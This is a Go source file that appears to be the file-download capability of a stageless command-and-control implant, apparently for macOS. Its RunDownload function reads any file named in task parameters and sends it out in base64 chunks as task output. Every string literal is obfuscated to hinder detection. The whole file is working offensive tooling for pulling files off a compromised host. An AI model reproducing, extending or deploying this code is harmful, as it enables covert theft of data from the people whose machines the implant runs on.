package capabilities

import (
	"encoding/base64"
	"encoding/json"
	"io"
	"os"
	"strconv"
	"strings"

	"stageless/utils/general"
	"stageless/utils/macapi"
	"stageless/utils/obf"
	"stageless/utils/tasks"
)

const chunkSize = 25 * 1024 * 1024
const maxWaitTasks = 180

func RunDownload(input, params, taskTag string) []byte {
	// Main function that sends a file in chunks
	_ = input
	downloadID := tasks.ParamValue(params, obf.S("download_id"), []string{obf.S("--download-id")})
	filePath := tasks.ParamValue(params, obf.S("file"), []string{obf.S("-f"), obf.S("--file")})
	if filePath == "" {
		var p map[string]any
		if err := json.Unmarshal([]byte(params), &p); err == nil {
			if v, ok := p[obf.S("args")].(string); ok {
				filePath = strings.Trim(v, "\"'")
			}
		}
	}
	if filePath == "" {
		return WriteMsg(obf.S("Error: missing file path"))
	}
	if taskTag == "" {
		return WriteMsg(obf.S("Error: missing task tag"))
	}
	ok, mainRec := tasks.ReadTaskExport(0, taskTag)
	if !ok {
		return WriteMsg(obf.S("Error: missing download task"))
	}
	mainTaskID := mainRec.ID
	limitMb := 2024
	sizeStr := tasks.ParamValue(params, obf.S("size"), []string{obf.S("--size")})
	if sizeStr != "" {
		if n, err := strconv.Atoi(strings.TrimSpace(sizeStr)); err == nil && n > 0 {
			limitMb = n
		}
	}
	limitBytes := uint64(limitMb) * 1024 * 1024
	st, err := os.Stat(filePath)
	if err != nil {
		return WriteMsg(obf.S("Error: ") + macapi.IOErrorMessage(err))
	}
	if st.IsDir() {
		return WriteMsg(obf.S("Error: Path is a directory"))
	}
	fileSize := uint64(st.Size())
	if fileSize > limitBytes {
		return WriteMsg(obf.S("Error: File is larger than 2GB, use --size <int> to raise the limit (MB)"))
	}
	if fileSize == 0 {
		return WriteMsg(obf.S("Error: file is empty"))
	}
	f, err := os.Open(filePath)
	if err != nil {
		return WriteMsg(obf.S("Error: ") + macapi.IOErrorMessage(err))
	}
	defer f.Close()

	var off uint64
	for off < fileSize {
		want := chunkSize
		if fileSize-off < uint64(want) {
			want = int(fileSize - off)
		}
		piece := make([]byte, want)
		got, err := io.ReadFull(f, piece)
		if err != nil {
			return WriteMsg(obf.S("Error: download read interrupted"))
		}
		if got != want {
			return WriteMsg(obf.S("Error: download read interrupted"))
		}
		more := off+uint64(want) < fileSize
		chunk := map[string]any{
			obf.S("option"):   obf.S("output"),
			obf.S("type"):     obf.S("terminal"),
			obf.S("task_tag"): taskTag,
			obf.S("output"):   base64.StdEncoding.EncodeToString(piece),
			obf.S("more"):     more,
			obf.S("total"):    fileSize,
		}
		if downloadID != "" {
			chunk[obf.S("download_id")] = downloadID
		}
		chunk[obf.S("task_id")] = mainTaskID
		payload := general.MarshalJSON(chunk)
		outID := tasks.ApplyTaskOutput(payload, obf.S("{}"), taskTag)
		waitCycles := 0
		for {
			ok, t := tasks.ReadTaskExport(outID, "")
			if !ok || !t.PendingOut {
				break
			}
			waitCycles++
			if waitCycles >= maxWaitTasks {
				return WriteMsg(obf.S("Error: download chunk wait timeout"))
			}
			Sleep_now()
		}
		off += uint64(want)
	}
	return nil
}
